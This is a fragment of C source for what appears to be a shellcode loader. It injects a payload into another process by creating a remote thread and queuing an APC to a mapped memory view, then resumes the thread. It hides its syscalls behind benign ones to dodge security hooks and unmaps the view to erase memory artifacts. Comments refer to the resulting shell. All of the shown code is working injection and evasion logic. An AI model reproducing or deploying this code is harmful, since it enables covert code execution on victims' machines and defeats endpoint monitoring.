	if ((status = ExecSyscall(&hRemoteThread, STANDARD_RIGHTS_ALL | SPECIFIC_RIGHTS_ALL, NULL, hProcess, (LPTHREAD_START_ROUTINE)RtlExitUserThread, NULL, TRUE, NULL, NULL, NULL, NULL)))
	{
		SET_LAST_NT_ERROR(status);
		DEBUG_PRINT("[!] NtCreateThreadEx Failed With Error: 0x%0.8X \n", GetLastError());
		return -1;
	}

	DEBUG_PRINT("[*]Remote thread create at: 0x%p\n", hRemoteThread);
	DEBUG_PRINT("[i]Press Enter to call NtQueueApcThread ...\n");
	_INT;

	SET_SYSCALL(g_SyscallTab.NtQueueApcThread, g_BenignSyscalltab.NtWriteFile);
	if ((status = ExecSyscall(hRemoteThread, (PIO_APC_ROUTINE)lpRemoteMap, NULL, NULL, NULL)))
	{
		SET_LAST_NT_ERROR(status);
		DEBUG_PRINT("[!] NtCreateThreadEx Failed With Error: 0x%0.8X \n", GetLastError());
		return -1;
	}

	DEBUG_PRINT("[i]Press Enter to call NtAlertResumeThread ...\n");
	_INT;

	SET_SYSCALL(g_SyscallTab.NtAlertResumeThread, g_BenignSyscalltab.NtCreateFile);
	if ((status = ExecSyscall(hRemoteThread, NULL)))
	{
		SET_LAST_NT_ERROR(status);
		DEBUG_PRINT("[!] NtAlertResumeThread Failed With Error: 0x%0.8X \n", GetLastError());
		return -1;
	}
	
	// slepp for 3 seconds then unmap to clear memory artifacts
	Sleep(2000);

	DEBUG_PRINT("[!] Unmapping remote view ...\n");

	// you might wanna wait after this is done before issuing any command
	SET_SYSCALL(g_SyscallTab.NtUnmapViewOfSection, g_BenignSyscalltab.NtCreateFile);
	if ((status = ExecSyscall(hProcess, lpRemoteMap)))
	{
		SET_LAST_NT_ERROR(status);
		DEBUG_PRINT("[!] NtUnmapViewOfSection Failed With Error: 0x%0.8X \n", GetLastError());
		return -1;
	}

	// better to do some more cleanup here...
	// be aware that exiting the shell crashes the parent process, no matter if the shellcode is generated exitfunc=thread
	// freeing
	HeapFree(GetProcessHeap(), 0, pPlaintext);

	return 0;
}

